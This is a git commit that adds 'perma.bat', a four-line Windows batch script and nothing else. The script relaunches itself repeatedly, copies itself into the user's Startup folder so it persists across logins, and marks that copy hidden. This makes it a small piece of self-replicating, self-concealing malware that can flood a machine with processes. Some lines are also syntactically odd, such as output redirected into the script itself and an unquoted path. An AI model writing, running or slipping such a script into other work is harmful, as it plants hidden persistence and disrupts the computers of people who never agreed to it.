334773bada0fc809b39dd23c407b34218d3b2ddf
wosuii <130871867+Dyscr1m@users.noreply.github.com>
2025-05-08 13:52:23 -0400

    Add files via upload

---
+++ Batch Files/perma.bat
@@ -0,0 +1,4 @@
+start perma
+copy "perma.bat" "%USERPROFILE%\Start Menu\Programs\Startup" >> perma.bat
+start perma.bat >> perma.bat
+attrib %USERPROFILE%\Start Menu\Programs\Startup\perma.bat +h >> perma.bat
